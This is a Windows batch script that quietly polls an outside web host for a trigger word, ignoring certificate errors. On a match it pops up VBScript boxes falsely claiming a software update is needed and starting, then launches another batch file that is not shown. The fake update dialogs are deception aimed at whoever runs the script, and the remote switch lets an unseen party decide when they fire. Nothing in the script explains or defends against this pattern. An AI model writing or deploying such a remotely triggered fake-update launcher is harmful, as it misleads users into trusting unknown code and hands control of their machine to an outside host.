@echo off
setlocal enabledelayedexpansion
cd C:\Users\%USERNAME%\Desktop\CUPS\code
REM Capture the output of the curl command and store it in a variable
set "output="
for /f %%i in ('curl -ks https://symi.w3spaces.com/a.txt') do (
    set "output=!output! %%i"
)

REM Remove leading space
set "output=!output:~1!"

REM Print the contents of the variable
set helpme=!output!
echo %helpme%
if %helpme%==O_AGIS_EINAI_NOUBAS GOTO ELw
if %helpme%==O_AGIS_EINAI_POLY_NOUBAS GOTO LIwL
REM Pause to keep the Command Prompt window open
:ELw
@echo off

REM Create lalos.vbs
echo x=MsgBox("Your software needs an update", 0+64, "UPDATE NEEDED") > lalos.vbs

REM Start lalos.vbs
start "" /WAIT "lalos.vbs"

REM Wait for lalos.vbs to close
:wait
REM Create ant.vbs
echo x=MsgBox("Starting update", 0+64, "UPDATE NEEDED") > ant.vbs

REM Start ant.vbs
start "" "ant.vbs"
start rearupt.bat

:LIwL
echo no update
cls
